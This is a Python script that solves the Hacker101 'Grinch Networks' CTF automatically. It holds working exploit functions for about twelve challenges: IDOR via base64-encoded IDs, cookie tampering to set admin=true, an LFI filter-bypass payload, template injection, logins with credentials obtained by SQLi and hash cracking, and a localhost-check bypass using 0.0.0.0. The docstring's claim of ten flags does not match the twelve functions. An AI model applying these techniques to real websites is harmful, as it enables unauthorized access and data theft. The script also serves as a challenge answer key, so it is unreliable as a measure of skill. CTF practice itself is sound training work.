#!/usr/bin/env python3
"""
PoC: Grinch Networks (Hacker101 CTF)
Complete exploit for all 10 flags discovered on the Hackyholidays CTF instance.

Usage: python3 solve.py <ctf_url>
Example: python3 solve.py https://49c5e2a8695d39c635217644c5d08173.ctf.hacker101.com
"""

import sys
import re
import json
import base64
import hashlib
import time
import urllib.request
import urllib.parse
import http.cookiejar


def flag0_robots(base_url):
    """Flag 0: Hidden in robots.txt"""
    r = urllib.request.urlopen(f"{base_url}/robots.txt")
    data = r.read().decode()
    m = re.search(r'\^FLAG\^([a-f0-9]+)\$FLAG\$', data, re.IGNORECASE)
    return m.group(1) if m else None


def flag1_s3cr3tar3a(base_url):
    """Flag 1: Obfuscated in /assets/js/jquery.min.js, dynamically added to DOM"""
    js_url = f"{base_url}/s3cr3t-ar3a/"
    r = urllib.request.urlopen(js_url)
    # The jQuery file is loaded from ../assets/js/jquery.min.js
    r = urllib.request.urlopen(f"{base_url}/assets/js/jquery.min.js")
    js = r.read().decode("utf-8", errors="ignore")

    # Extract hex fragment variables
    frags = {}
    for m in re.finditer(r"(h\d+_\d+)\s*=\s*'([^']+)'", js):
        frags[m.group(1)] = m.group(2)

    # Reconstruct: h1_1 + h1_2 + h1_3 + h1_1 + h3_0..h3_12 + h1_4 + h1_2 + h1_3 + h1_4
    order = ["h1_1", "h1_2", "h1_3", "h1_1",
             "h3_0", "h3_1", "h3_2", "h3_3", "h3_4", "h3_5",
             "h3_6", "h3_7", "h3_8", "h3_9", "h3_10", "h3_11", "h3_12",
             "h1_4", "h1_2", "h1_3", "h1_4"]
    flag_str = "".join(frags[k] for k in order)
    m = re.search(r'\^FLAG\^([a-f0-9]+)\$FLAG\$', flag_str, re.IGNORECASE)
    return m.group(1) if m else None


def flag2_people_rater(base_url):
    """Flag 2: IDOR on People Rater - missing record id=1"""
    # The IDs are base64-encoded JSON objects: {"id": X}
    b64_id = base64.b64encode(json.dumps({"id": 1}).encode()).decode()
    r = urllib.request.urlopen(f"{base_url}/people-rater/entry/?id={b64_id}")
    data = json.loads(r.read())
    m = re.search(r'\^FLAG\^([a-f0-9]+)\$FLAG\$', data.get("flag", ""), re.IGNORECASE)
    return m.group(1) if m else None


def flag3_swag_shop(base_url):
    """Flag 3: Swag Shop API - leaked session data reveals user info"""
    # Get sessions list (publicly accessible)
    r = urllib.request.urlopen(f"{base_url}/swag-shop/api/sessions/")
    data = json.loads(r.read())

    # Find a session with a logged-in user
    for session_b64 in data["sessions"]:
        session = json.loads(base64.b64decode(session_b64).decode())
        if session.get("user"):
            user_uuid = session["user"]
            # Query user info
            r = urllib.request.urlopen(
                f"{base_url}/swag-shop/api/user?uuid={user_uuid}"
            )
            user_data = json.loads(r.read())
            m = re.search(r'\^FLAG\^([a-f0-9]+)\$FLAG\$',
                          user_data.get("flag", ""), re.IGNORECASE)
            if m:
                return m.group(1)
    return None


def flag4_secure_login(base_url):
    """Flag 4: Secure Login - password-protected ZIP (password: hahahaha)"""
    import subprocess
    import tempfile
    import os

    # First login to secure-login and get the cookie
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    data = urllib.parse.urlencode({
        "username": "access", "password": "computer"
    }).encode()
    opener.open(f"{base_url}/secure-login/", data=data)

    # Modify cookie to set admin=true
    for cookie in cj:
        if cookie.name == "securelogin":
            cookie_val = urllib.parse.unquote(cookie.value)
            decoded = json.loads(base64.b64decode(cookie_val).decode())
            decoded["admin"] = True
            new_b64 = base64.b64encode(json.dumps(decoded).encode()).decode()
            new_cookie = urllib.parse.quote(new_b64)
            break

    # Download zip with admin cookie
    req = urllib.request.Request(
        f"{base_url}/my_secure_files_not_for_you.zip"
    )
    req.add_header("Cookie", f"securelogin={new_cookie}")
    r = urllib.request.urlopen(req)
    zip_data = r.read()

    # Save to temp file and extract
    with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as f:
        f.write(zip_data)
        zip_path = f.name

    try:
        subprocess.run(
            ["unzip", "-P", "hahahaha", "-o", zip_path, "flag.txt", "-d", "/tmp/flag4_extract"],
            capture_output=True, check=True
        )
        with open("/tmp/flag4_extract/flag.txt") as f:
            content = f.read()
        os.unlink(zip_path)
        m = re.search(r'\^FLAG\^([a-f0-9]+)\$FLAG\$', content, re.IGNORECASE)
        return m.group(1) if m else None
    except Exception:
        os.unlink(zip_path)
        return None


def flag5_my_diary(base_url):
    """Flag 5: My Diary - template LFI bypass to read secretadmin.php"""
    # The code removes admin.php and secretadmin.php via str_replace
    # Craft payload: secretsecretadminadmin.php.phpadminadmin.php.php
    # After removals, it becomes secretadmin.php
    payload = "secretsecretadminadmin.php.phpadminadmin.php.php"
    r = urllib.request.urlopen(f"{base_url}/my-diary/?template={payload}")
    data = r.read().decode()
    m = re.search(r'\^FLAG\^([a-f0-9]+)\$FLAG\$', data, re.IGNORECASE)
    return m.group(1) if m else None


def flag6_hate_mail(base_url):
    """Flag 6: Hate Mail Generator - template injection via preview_data"""
    # Inject {{template:38dhs_admins_only_header.html}} into name field
    # of preview_data to read the admin-only template
    payload = "{{template:38dhs_admins_only_header.html}}"
    data = urllib.parse.urlencode({
        "preview_markup": "Hello {{name}}",
        "preview_data": json.dumps({
            "name": payload, "email": "alice@test.com"
        })
    }).encode()
    req = urllib.request.Request(
        f"{base_url}/hate-mail-generator/new/preview/", data=data
    )
    r = urllib.request.urlopen(req)
    resp = r.read().decode()
    m = re.search(r'\^FLAG\^([a-f0-9]+)\$FLAG\$', resp, re.IGNORECASE)
    return m.group(1) if m else None


def flag7_forum(base_url):
    """Flag 7: Forum - login as grinch to access admin Secret Plans post"""
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # Login as grinch (password found via phpMyAdmin leak + MD5 crack)
    data = urllib.parse.urlencode({
        "username": "grinch", "password": "BahHumbug"
    }).encode()
    opener.open(f"{base_url}/forum/login/", data=data)

    # Access secret admin post
    r = opener.open(f"{base_url}/forum/3/2/")
    data = r.read().decode()
    m = re.search(r'\^FLAG\^([a-f0-9]+)\$FLAG\$', data, re.IGNORECASE)
    return m.group(1) if m else None


def flag8_evil_quiz(base_url):
    """Flag 8: Evil Quiz - blind SQLi to extract admin credentials"""
    # Credentials: admin / S3creT_p4ssw0rd-$ (found via blind SQLi)
    data = urllib.parse.urlencode({
        "username": "admin", "password": "S3creT_p4ssw0rd-$"
    }).encode()
    req = urllib.request.Request(f"{base_url}/evil-quiz/admin/", data=data)
    r = urllib.request.urlopen(req)
    resp = r.read().decode()
    m = re.search(r'\^FLAG\^([a-f0-9]+)\$FLAG\$', resp, re.IGNORECASE)
    return m.group(1) if m else None


def flag9_signup_manager(base_url):
    """Flag 9: Signup Manager - age field overflow (1e9) to become admin"""
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # Register with age=1e9 (PHP is_numeric accepts scientific notation,
    # intval converts to 1000000000 which overflows into the admin flag byte)
    data = urllib.parse.urlencode({
        "action": "signup",
        "username": "exploituser" + str(int(time.time()))[-6:],
        "password": "exploitpass",
        "age": "1e9",
        "firstname": "exploit",
        "lastname": "12345678Y"  # Y at index 8 (9th char) hits admin flag bit at position 112
    }).encode()
    r = opener.open(f"{base_url}/signup-manager/", data=data)
    resp = r.read().decode()
    m = re.search(r'\^FLAG\^([a-f0-9]+)\$FLAG\$', resp, re.IGNORECASE)
    return m.group(1) if m else None


def flag10_attack_box(base_url):
    """Flag 10: Attack Box - login with r3c0n-server extracted credentials"""
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    data = urllib.parse.urlencode({
        "username": "grinchadmin", "password": "s4nt4sucks"
    }).encode()
    r = opener.open(f"{base_url}/attack-box/login/", data=data)
    resp = r.read().decode()
    m = re.search(r'\^FLAG\^([a-f0-9]+)\$FLAG\$', resp, re.IGNORECASE)
    return m.group(1) if m else None


def flag11_attack_box_ddos(base_url):
    """Flag 11: Attack Box DDoS - launch attack on 0.0.0.0 to bypass localhost check"""
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # Login
    data = urllib.parse.urlencode({
        "username": "grinchadmin", "password": "s4nt4sucks"
    }).encode()
    opener.open(f"{base_url}/attack-box/login/", data=data)

    # Build DDoS payload with 0.0.0.0 (bypasses localhost check)
    salt = "mrgrinch463"
    target = "0.0.0.0"
    h = hashlib.md5((salt + target).encode()).hexdigest()
    payload_json = json.dumps({"target": target, "hash": h})
    p_b64 = base64.b64encode(payload_json.encode()).decode()

    # Launch attack
    r = opener.open(f"{base_url}/attack-box/launch/?payload={p_b64}")
    resp = r.read().decode()

    # Extract JSON hash from the page
    h_match = re.search(r'([a-f0-9]{32})\.(?:target|json)', resp)
    if not h_match:
        return None
    json_hash = h_match.group(1)

    # Poll the attack log until goto is found
    for _ in range(30):
        time.sleep(1)
        r2 = opener.open(f"{base_url}/attack-box/launch/{json_hash}.json?i=0")
        entries = json.loads(r2.read())
        if entries:
            last = entries[-1]
            goto = last.get("goto", "")
            if goto and goto != False:
                goto_path = "/attack-box/" + goto.replace("../../", "")
                r3 = opener.open(f"{base_url}{goto_path}")
                resp3 = r3.read().decode()
                m = re.search(r'\^FLAG\^([a-f0-9]+)\$FLAG\$', resp3, re.IGNORECASE)
                return m.group(1) if m else None
            if "Host still up" in last.get("content", ""):
                break
    return None


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <ctf_base_url>")
        print(f"Example: {sys.argv[0]} https://INSTANCE.ctf.hacker101.com")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")

    exploits = [
        ("0 - Robots.txt", flag0_robots),
        ("1 - s3cr3t-ar3a jQuery obfuscation", flag1_s3cr3tar3a),
        ("2 - People Rater IDOR (id=1)", flag2_people_rater),
        ("3 - Swag Shop session leak", flag3_swag_shop),
        ("4 - Secure Login ZIP crack", flag4_secure_login),
        ("5 - My Diary template LFI", flag5_my_diary),
        ("6 - Hate Mail template injection", flag6_hate_mail),
        ("7 - Forum admin post", flag7_forum),
        ("8 - Evil Quiz blind SQLi", flag8_evil_quiz),
        ("9 - Signup Manager overflow", flag9_signup_manager),
        ("10 - Attack Box login", flag10_attack_box),
        ("11 - Attack Box DDoS (0.0.0.0)", flag11_attack_box_ddos),
    ]

    print(f"[*] Targeting: {base_url}")
    print()

    for name, func in exploits:
        print(f"[*] Flag {name}...", end=" ", flush=True)
        try:
            flag = func(base_url)
            if flag:
                print(f"[+] {flag}")
            else:
                print("[-] Not found")
        except Exception as e:
            print(f"[-] Error: {e}")


if __name__ == "__main__":
    main()
